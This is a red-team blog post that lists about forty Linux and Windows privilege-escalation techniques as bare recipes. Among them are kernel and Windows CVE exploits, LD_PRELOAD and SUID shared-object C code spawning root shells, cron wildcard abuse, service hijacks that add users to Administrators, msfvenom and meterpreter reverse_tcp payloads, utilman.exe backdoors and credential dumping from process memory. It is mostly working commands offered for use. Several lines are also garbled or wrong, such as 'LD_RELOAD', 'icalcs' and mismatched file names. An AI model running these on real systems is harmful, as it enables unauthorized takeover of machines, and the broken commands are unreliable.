---
layout: post
title:  "40 Methods For Privilege Escalation(RTC0001)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/11.jpg
description: "40 Methods For Privilege Escalation"
featured: true
hidden: true
rating: 4.5
---


# DirtyC0w

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1.  gcc -pthread c0w.c -o c0w; ./c0w; passwd; id

<!-- TOC --><a name="cve-2016-1531"></a>
# CVE-2016-1531

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

2.  CVE-2016-1531.sh;id

<!-- TOC --><a name="polkit"></a>
# Polkit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

2\.

poc.sh

<!-- TOC --><a name="dirtypipe"></a>
# DirtyPipe

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./traitor-amd64 \--exploit kernel:CVE-2022-0847

2\.

Whoami;id

<!-- TOC --><a name="pwnkit"></a>
# PwnKit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./cve-2021-4034

2\.

Whoami;id

<!-- TOC --><a name="ms14_058"></a>
# ms14_058

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

msf \> use exploit/windows/local/ms14_058_track_popup_menu

msf exploit(ms14_058_track_popup_menu) \> set TARGET \< target-id \>

msf exploit(ms14_058_track_popup_menu) \> exploit

<!-- TOC --><a name="hot-potato"></a>
# Hot Potato

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

In command prompt type: powershell.exe -nop -ep bypass

2\.

In Power Shell prompt type: Import-Module
C:\\Users\\User\\Desktop\\Tools\\Tater\\Tater.ps1

3\.

In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command \"net
localgroup

administrators user /add\"

4\.

To confirm that the attack was successful, in Power Shell prompt type:

net localgroup administrators

<!-- TOC --><a name="intel-sysret"></a>
# Intel SYSRET

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

execute -H -f sysret.exe -a \"-pid \[pid\]"

<!-- TOC --><a name="printnightmare"></a>
# PrintNightmare

Domain: Yes

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/outflanknl/PrintNightmare

2\.

PrintNightmare 10.10.10.10 exp.dll

<!-- TOC --><a name="folina"></a>
# Folina

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/JohnHammond/msdt-follina

2\.

python3 follina.py -c \"notepad\"

<!-- TOC --><a name="alpc"></a>
# ALPC

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/riparino/Task_Scheduler_ALPC

<!-- TOC --><a name="remotepotato0"></a>
# RemotePotato0

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

sudo ntlmrelayx.py -t ldap://10.0.0.10 \--no-wcf-server \--escalate-user
normal_user

2\.

.\\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1

<!-- TOC --><a name="cve-2022-26923"></a>
# CVE-2022-26923

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

certipy req \'lab.local/cve\$:CVEPassword1234\*\@10.100.10.13\'
-template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA

2\.

Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx
/password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\"
/dc:\"DOMAIN_CONTROLLER\" /show

<!-- TOC --><a name="ms14-068"></a>
# MS14-068

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

python ms14-068.py -u user-a-1\@dom-a.loc -s
S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc

<!-- TOC --><a name="sudo-ld_preload"></a>
# Sudo LD_PRELOAD

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

\#include \<stdio.h\>

\#include \<sys/types.h\>

\#include \<stdlib.h\>

1\. void \_init() {

unsetenv(\"LD_PRELOAD\");

setgid(0);

setuid(0);

system(\"/bin/bash\");

}

2\.

gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles

3\.

sudo LD_RELOAD=tmp/ldreload.so apache2

4\.

id

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-so-injection"></a>
# Abusing File Permission via SUID Binaries - .so injection) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

1\.

Mkdir /home/user/.config

2\.

\#include \<stdio.h\>

\#include \<stdlib.h\>

static void inject() \_attribute \_((constructor));

void inject() {

system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash
-p\");

}

3\.

gcc -shared -o /home/user/.config/libcalc.so
-fPIC/home/user/.config/libcalc.c

4\.

/usr/local/bin/suid-so

5\.

id

<!-- TOC --><a name="dll-injection"></a>
# DLL Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

RemoteDLLInjector64

Or

MemJect

Or

https://github.com/tomcarver16/BOF-DLL-Inject

2\.

\#define PROCESS_NAME \"csgo.exe\"

Or

RemoteDLLInjector64.exe pid C:\\runforpriv.dll

Or

mandllinjection ./runforpriv.dll pid

<!-- TOC --><a name="early-bird-injection"></a>
# Early Bird Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

hollow svchost.exe pop.bin

<!-- TOC --><a name="process-injection-through-memory-section"></a>
# Process Injection through Memory Section

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

sec-shinject PID /path/to/bin

<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-path-overwrite"></a>
# Abusing Scheduled Tasks via Cron Path Overwrite

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

1.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > systemupdate.sh;

2.  chmod +x systemupdate.sh

3.  Wait a while

4.  /tmp/bash -p

5.  id && whoami

<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-wildcards"></a>
# Abusing Scheduled Tasks via Cron Wildcards

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

6.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > /home/user/systemupdate.sh;

7.  touch /home/user/ \--checkpoint=1;

8.  touch /home/user/ \--checkpoint-action=exec=sh\\systemupdate.sh

9.  Wait a while

10. /tmp/bash -p

11. id && whoami

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-symlink"></a>
# Abusing File Permission via SUID Binaries - Symlink) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

su - www-data;

2\.

nginxed-root.sh /var/log/nginx/error.log;

3\.

In root user

invoke-rc.d nginx rotate \>/dev/null 2\>&1

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-1"></a>
# Abusing File Permission via SUID Binaries - Environment Variables \#1) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

echo \'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return
0; }\' \>/tmp/service.c;

2\.

gcc /tmp/services.c -o /tmp/service;

3\.

export PATH=/tmp:\$PATH;

4\.

/usr/local/bin/sudi-env; id

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-2"></a>
# Abusing File Permission via SUID Binaries - Environment Variables \#2) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

env -i SHELLOPTS=xtrace PS4=\'\$(cp /bin/bash /tmp && chown root.root
/tmp/bash && chmod +S /tmp/bash)\' /bin/sh -c /usr/local/bin/suid-env2;
set +x; /tmp/bash -p\'

<!-- TOC --><a name="dll-hijacking"></a>
# DLL Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Windows_dll.c:

cmd.exe /k net localgroup administrators user /add

2\.

x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

3\.

sc stop dllsvc & sc start dllsvc

<!-- TOC --><a name="abusing-services-via-binpath"></a>
# Abusing Services via binPath

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

sc config daclsvc binpath= \"net localgroup administrators user /add\"

2\.

sc start daclsvc

<!-- TOC --><a name="abusing-services-via-unquoted-path"></a>
# Abusing Services via Unquoted Path

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup administrators user /add\'
-f exe-service -o

common.exe

2\.

Place common.exe in 'C:\\Program Files\\Unquoted Path Service'.

3\.

sc start unquotedsvc

<!-- TOC --><a name="abusing-services-via-registry"></a>
# Abusing Services via Registry

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath
/t

REG_EXPAND_SZ /d c:\\temp\\x.exe /f

2\.

sc start regsvc

<!-- TOC --><a name="abusing-services-via-executable-file"></a>
# Abusing Services via Executable File

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

copy /y c:\\Temp\\x.exe \"c:\\Program Files\\File Permissions
Service\\filepermservice.exe\"

2\.

sc start filepermsvc

<!-- TOC --><a name="abusing-services-via-autorun"></a>
# Abusing Services via Autorun

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use multi/handler

In Metasploit (msf \> prompt) type: set payload
windows/meterpreter/reverse_tcp

In Metasploit (msf \> prompt) type: set lhost \[Kali VM IP Address\]

In Metasploit (msf \> prompt) type: run

Open an additional command prompt and type:

msfvenom -p windows/meterpreter/reverse_tcp lhost=\[Kali VM IP Address\]
-f exe -o

program.exe

2\.

Place program.exe in 'C:\\Program Files\\Autorun Program'.

<!-- TOC --><a name="abusing-services-via-alwaysinstallelevated"></a>
# Abusing Services via AlwaysInstallElevated

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup

administrators user /add\' -f msi-nouac -o setup.msi

2\.

msiexec /quiet /qn /i C:\\Temp\\setup.msi

Or

SharpUp.exe AlwaysInstallElevated

<!-- TOC --><a name="abusing-services-via-secreatetoken"></a>
# Abusing Services via SeCreateToken

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

!rmpriv

<!-- TOC --><a name="abusing-services-via-sedebug"></a>
# Abusing Services via SeDebug

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Conjure-LSASS

Or

syscall_enable_priv 20

<!-- TOC --><a name="remote-process-via-syscalls-hellsgatehalosgate"></a>
# Remote Process via Syscalls (HellsGate\|HalosGate)

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

injectEtwBypass pid

<!-- TOC --><a name="escalate-with-duplicatetokenex"></a>
# Escalate With DuplicateTokenEx

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

PrimaryTokenTheft.exe pid

Or

TokenPlaye.exe \--impersonate \--pid pid

<!-- TOC --><a name="abusing-services-via-seincreasebasepriority"></a>
# Abusing Services via SeIncreaseBasePriority

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

start /realtime SomeCpuIntensiveApp.exe

<!-- TOC --><a name="abusing-services-via-semanagevolume"></a>
# Abusing Services via SeManageVolume

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Just only compile and run SeManageVolumeAbuse

<!-- TOC --><a name="abusing-services-via-serelabel"></a>
# Abusing Services via SeRelabel

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

WRITE_OWNER access to a resource, including files and folders.

2\.

Run for privilege escalation

<!-- TOC --><a name="abusing-services-via-serestore"></a>
# Abusing Services via SeRestore

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. Launch PowerShell/ISE with the SeRestore privilege present.

2\. Enable the privilege with Enable-SeRestorePrivilege).

3\. Rename utilman.exe to utilman.old

4\. Rename cmd.exe to utilman.exe

5\. Lock the console and press Win+U

<!-- TOC --><a name="abuse-via-sebackup"></a>
# Abuse via SeBackup

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use
auxiliary/server/capture/http_basic

In Metasploit (msf \> prompt) type: set uripath x

In Metasploit (msf \> prompt) type: run

2\.

In taskmgr and right-click on the "iexplore.exe" in the "Image Name"
column

and select "Create Dump File" from the popup menu.

3\.

strings /root/Desktop/iexplore.DMP \| grep \"Authorization: Basic\"

Select the Copy the Base64 encoded string.

In command prompt type: echo -ne \[Base64 String\] \| base64 -d

<!-- TOC --><a name="abusing-via-secreatepagefile"></a>
# Abusing via SeCreatePagefile

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT
uncompressed.bin

<!-- TOC --><a name="abusing-via-sesystemenvironment"></a>
# Abusing via SeSystemEnvironment 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

<!-- TOC --><a name="abusing-via-setakeownership"></a>
# Abusing via SeTakeOwnership 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. takeown.exe /f \"%windir%\\system32\"

2\. icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F

3\. Rename cmd.exe to utilman.exe

4\. Lock the console and press Win+U

<!-- TOC --><a name="abusing-via-setcb"></a>
# Abusing via SeTcb 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

PSBits

Or

PrivFu

2\.

psexec.exe -i -s -d cmd.exe

<!-- TOC --><a name="abusing-via-setrustedcredmanaccess"></a>
# Abusing via SeTrustedCredManAccess 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

Or

CredManBOF

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

